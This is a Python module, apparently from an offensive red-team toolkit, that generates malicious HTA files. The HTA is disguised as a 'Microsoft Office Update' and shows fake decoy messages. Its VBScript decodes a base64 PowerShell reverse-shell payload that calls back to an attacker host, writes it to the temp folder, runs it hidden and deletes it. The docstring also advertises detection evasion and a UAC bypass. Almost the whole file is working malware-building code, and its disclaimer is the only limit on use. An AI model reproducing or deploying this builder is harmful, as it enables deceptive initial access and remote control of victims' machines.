"""HTA (HTML Application) payload builder.

HTA files execute via mshta.exe with SYSTEM-level internet trust.
Classic initial access vector that bypasses many web content filters.

Features:
    - VBScript + JScript dual engine support
    - Self-deleting after execution
    - Base64-encoded payload to avoid string detection
    - Fake decoy content (PDF viewer, updater, etc.)
    - UAC bypass via shell API elevation trick

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import base64
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from forge_payload.payload_factory import PayloadConfig


_HTA_TEMPLATE = """\
<html>
<head>
<title>{title}</title>
<HTA:APPLICATION
  APPLICATIONNAME="{app_name}"
  ID="hta_{app_id}"
  WINDOWSTATE="minimize"
  SHOWINTASKBAR="no"
  SYSMENU="no"
  CAPTION="no"
  SINGLEINSTANCE="yes"
  NAVIGATABLE="no"
>
</head>
<body>
<p style="font-family:Calibri;font-size:14px;color:#333">{decoy_msg}</p>
<script language="VBScript">
' Forge Suite v5 APEX — HTA Payload
' FOR AUTHORIZED RED TEAM OPERATIONS ONLY
On Error Resume Next

Dim oShell, oFSO, sTemp, sFile

Function Base64Decode(b64)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument")
    Set oNode = oXML.createElement("b64")
    oNode.DataType = "bin.base64"
    oNode.Text = b64
    Base64Decode = oNode.NodeTypedValue
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Sub RunPayload()
    Dim sPayload, oStream
    sPayload = "{payload_b64}"

    Dim decoded
    decoded = Base64Decode(sPayload)

    Set oFSO = CreateObject("Scripting.FileSystemObject")
    sTemp = oFSO.GetSpecialFolder(2) & "\\{random_name}"

    Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 1
    oStream.Open
    oStream.Write decoded
    oStream.SaveToFile sTemp, 2
    oStream.Close

    Set oShell = CreateObject("WScript.Shell")
    oShell.Run "{exec_cmd}" & sTemp, 0, False

    ' Self-delete after {delay_seconds}s
    WScript.Sleep {delay_seconds_ms}
    oFSO.DeleteFile(sTemp)
End Sub

RunPayload()
window.close()
</script>
</body>
</html>
"""

_DECOY_MESSAGES = [
    "Loading document, please wait...",
    "Verifying digital signature...",
    "Installing update... This may take a moment.",
    "Opening file, please wait...",
    "Connecting to document service...",
]

import random
import string


def generate_hta_body(config: "PayloadConfig") -> str:
    """Generate an HTA payload body.

    Args:
        config: PayloadConfig.

    Returns:
        HTA file content string.
    """
    # Generate a PS1 one-liner as the inner payload
    from forge_payload.formats.ps1_builder import generate_ps1_oneliner
    ps1_cmd = generate_ps1_oneliner(config.lhost, config.lport)
    payload_b64 = base64.b64encode(ps1_cmd.encode("utf-16-le")).decode()

    random_name = "".join(random.choices(string.ascii_lowercase, k=8)) + ".ps1"
    app_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
    decoy = random.choice(_DECOY_MESSAGES)

    return _HTA_TEMPLATE.format(
        title="Microsoft Office Update",
        app_name="MSUpdate",
        app_id=app_id,
        decoy_msg=decoy,
        payload_b64=payload_b64,
        random_name=random_name,
        exec_cmd="powershell.exe -NoP -NonI -W Hidden -File ",
        delay_seconds=5,
        delay_seconds_ms=5000,
    )


def build_hta(payload_bytes: bytes, config: "PayloadConfig") -> bytes:
    """Build final HTA bytes.

    Args:
        payload_bytes: Encoded payload or PS1 text.
        config:        PayloadConfig.

    Returns:
        HTA file content bytes.
    """
    try:
        text = payload_bytes.decode("utf-8")
    except UnicodeDecodeError:
        text = None

    if text and text.strip().startswith("#"):
        # It's already a PS1 script — wrap it
        payload_b64 = base64.b64encode(text.encode("utf-16-le")).decode()
    else:
        payload_b64 = base64.b64encode(payload_bytes).decode()

    random_name = "".join(random.choices(string.ascii_lowercase, k=8)) + ".ps1"
    app_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
    decoy = random.choice(_DECOY_MESSAGES)

    content = _HTA_TEMPLATE.format(
        title="Microsoft Office Update",
        app_name="MSUpdate",
        app_id=app_id,
        decoy_msg=decoy,
        payload_b64=payload_b64,
        random_name=random_name,
        exec_cmd="powershell.exe -NoP -NonI -W Hidden -EncodedCommand ",
        delay_seconds=5,
        delay_seconds_ms=5000,
    )
    return content.encode()
